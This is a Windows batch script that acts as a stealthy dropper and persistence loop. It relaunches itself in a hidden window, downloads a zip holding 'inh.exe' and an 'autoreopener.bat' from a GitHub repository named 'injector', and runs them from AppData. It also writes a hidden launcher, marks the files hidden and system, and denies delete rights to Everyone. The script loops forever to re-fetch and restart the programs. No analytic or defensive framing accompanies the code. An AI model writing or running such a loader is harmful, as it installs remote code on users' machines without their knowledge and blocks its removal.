@echo off

:: Relaunch hidden if needed
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Paths
set "APP_DIR=%USERPROFILE%\AppData"
set "EXE_PATH=%APP_DIR%\inh.exe"
set "EXE_PATH1=%APP_DIR%\autoreopener.bat"
set "ZIP_PATH=%APP_DIR%\inh.zip"
set "DOWNLOAD_URL=https://raw.githubusercontent.com/dexovision/injector/main/inh.zip"
set "DOWNLOAD_URL1=https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat"

:loop
:: If missing, download and extract
if not exist "%EXE_PATH%" (
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_PATH%'"
    powershell -Command "Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%APP_DIR%' -Force"
    del "%ZIP_PATH%"
    attrib +h +s %USERPROFILE%\AppData\inh.exe
)

if not exist "%EXE_PATH1%" (
    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL1%' -OutFile '%EXE_PATH1%'"
    attrib +h +s "%EXE_PATH1%"
)

set "LAUNCHER_BAT=%APPDATA%\launcher.bat"
if not exist "%LAUNCHER_BAT%" (
    (
        echo @echo off
        echo start "" "%APPDATA%\inh.exe"
        echo start "" "%APPDATA%\autoreopener.bat"
    ) > "%LAUNCHER_BAT%"
    attrib +h +s "%LAUNCHER_BAT%"
)

:: Ensure running
tasklist /fi "imagename eq inh.exe" | find /i "inh.exe" >nul
if errorlevel 1 start "" "%EXE_PATH%"

timeout /t 1 /nobreak >nul
attrib +h +s "%EXE_PATH1%"
icacls "%EXE_PATH1%" /grant:r *S-1-1-0:(RX)
icacls "%EXE_PATH1%" /deny *S-1-1-0:(D)

attrib +h +s "%EXE_PATH%"
icacls "%EXE_PATH%" /grant:r *S-1-1-0:(RX)
icacls "%EXE_PATH%" /deny *S-1-1-0:(D)

attrib +h +s "%LAUNCHER_BAT%"
icacls "%APPDATA%\launcher.bat" /grant:r *S-1-1-0:(RX)
icacls "%APPDATA%\launcher.bat" /deny *S-1-1-0:(D)

goto loop
